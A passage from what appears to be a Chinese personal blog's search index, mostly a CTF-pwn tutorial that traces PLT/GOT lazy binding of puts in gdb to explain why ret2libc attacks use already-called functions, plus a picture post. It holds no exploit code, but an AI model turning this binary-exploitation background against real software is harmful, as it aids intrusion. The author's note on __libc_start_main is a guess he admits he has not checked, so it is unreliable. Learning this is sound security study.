rbp<br></code></pre></td></tr></table></figure><p>跳转到了0x555555555030这个地址，gdb对其的标注为&lt;puts@plt&gt;</p><p>查看一下这个地址上的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure><p>这里第一条指令，jmp 0x555555558000，gdb对其的标注为&lt;puts@got[plt]&gt;，查看这个地址上的值，会发现这个指令在原地跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //这个地址就是上面plt表的第二条指令<br></code></pre></td></tr></table></figure><p>相当于什么也没做</p><p>那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，<code>jmp 0x555555555020</code>来完成的，这里先不对这个函数进行分析，直接来看结果</p><p><strong>在printf函数后面下断点，重新查看刚才&lt;puts@got[plt]&gt;上的内容</strong></p><p><img src="/img/plt&got/2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure><p>发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure><p><strong>因此可以得出结论</strong></p><p>​    plt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上</p><p>​    这样就是为什么ret2libc需要使用用已被调用过的函数</p><p><em>tips：</em></p><p><em>linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)</em></p><p><strong>然后解决如何寻找函数地址的问题</strong>：</p><p>​    在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：</p><p><img src="/img/plt&got/3.jpg"></p><p>​    这个push的值唯一标识了寻找的函数，</p><p>​    然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure><p>如果在gdb未开始调试的时候，查看这个jmp的值，是0x0</p><p>而在printf函数前的断点查看，会发现它发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure><p>这个函数为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，此处不在对其具体分析，其用处即为寻找编号为<code>reloc_index</code>的函数</p><h5 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h5><p><strong>第一次调用</strong></p><p><img src="/img/plt&got/4.jpg"></p><p><strong>第二次调用</strong></p><p><img src="/img/plt&got/5.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可爱的小黄鸡</title>
    <link href="/2022/11/16/%E6%9D%82%E9%A1%B9/%E5%B0%8F%E9%BB%84%E9%B8%A1/"/>
    <url>/2022/11/16/%E6%9D%82%E9%A1%B9/%E5%B0%8F%E9%BB%84%E9%B8%A1/</url>
    
    <content type="html"><![CDATA[<p>可爱的小黄鸡 0v0</p><p><img src="/img/basic/1.jpg"><br><img src="/img/basic/2.jpg"><br><img src="/img/basic/3.jpg"><br><img src="/img/basic/4.jpg"><br><img src="/img/basic/5.jpg"><br><img src="/img/basic/6.jpg"><br><img src="/img/basic/7.jpg"><br><img src="/img/basic/9.jpg"><br><img src="/img/basic/1.gif"><br><img src="/img/basic/2.gif"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
